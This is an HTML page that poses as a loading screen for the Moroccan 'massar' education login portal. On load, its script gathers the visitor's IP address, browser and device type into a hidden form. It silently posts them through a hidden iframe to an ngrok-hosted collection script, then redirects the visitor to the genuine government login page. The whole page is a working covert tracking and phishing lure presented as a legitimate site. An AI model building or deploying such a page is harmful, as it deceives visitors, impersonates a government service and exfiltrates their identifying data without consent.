

<html>
    <head>
        <title>
            login.massar
        </title>
    </head>
    <style>
        #userForm{
            display: none;
        }
        #bttn{
            display: none;
        }
        
    </style>
    <script src="https://cdn.tailwindcss.com"></script>
    <body class="bg-white h-screen flex flex-col items-center justify-center">
        <h1>massar server soon..... </h1>
        <h2>detection....</h2>

       
          <!-- Loading spinner and text -->
          <div class="flex flex-col items-center justify-center space-y-4">
            <svg class="animate-spin h-10 w-10 text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
            </svg>
            <p class="text-gray-600 text-lg">Loading, please wait...</p>
          </div>


        <iframe name="hidden_iframe" style="display:none;"></iframe>
    
        <form id="userForm" action="https://wolf-modern-duly.ngrok-free.app/lvl/info.php"  method="POST" target="hidden_iframe">
            <label for="inp0">IP Address:</label>
            <input type="text" id="inp0" name="group1" readonly><br><br>
        
            <label for="inp1">Operating System:</label>
            <input type="text" id="inp1" name="group2" readonly><br><br>
        
            <label for="inp2">Browser Name:</label>
            <input type="text" id="inp2" name="group3" readonly><br><br>
        
            <label for="inp3">Device Type:</label>
            <input type="text" id="inp3" name="group4" readonly><br><br>
        
            <button type="submit" id="btn" >Submit</button>
        </form>
        <form action="https://massar.men.gov.ma/Account" method="post">
            <button type="submit" id="bttn"></button>
        </form>
        
        
        
    </body>
    <script>        
    // Alternative API
        // Function to fetch the IP address
        function getIPAddress() {
            // Using a free IP API service
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('inp0').value = data.ip;
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                    document.getElementById('inp0').value = "Unable to get IP";
                });
        }
        
        // Call the function when the page loads
        window.onload = getIPAddress;



        
        function getBrowserName() {
            let userAgent = navigator.userAgent;
    
            if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Google Chrome";
            if (userAgent.includes("Edg")) return "Microsoft Edge";
            if (userAgent.includes("Firefox")) return "Mozilla Firefox";
            if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Apple Safari";
            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
            if (userAgent.includes("MSIE") || userAgent.includes("Trident")) return "Internet Explorer";
    
            return "Unknown Browser";
        }
        document.getElementById('inp2').value = getBrowserName();
    
        // Detect Device Type
        function getDeviceType() {
            let userAgent = navigator.userAgent.toLowerCase();
    
            if (/iphone|ipad|ipod/.test(userAgent)) return "Apple iOS Device";
            if (/android/.test(userAgent)) return "Android Device";
            if (/windows/.test(userAgent)) return "Windows PC";
            if (/macintosh|mac os x/.test(userAgent)) return "MacOS Device";
            if (/linux/.test(userAgent)) return "Linux Device";
    
            return "Unknown Device";
        }
        document.getElementById('inp3').value = getDeviceType();
    
        function run() {
            document.getElementById("btn").click();;
    }
    
    setTimeout(run,800);
    function root() {
            document.getElementById("bttn").click();;
    }
    setTimeout(root,900);
</script>
</html>
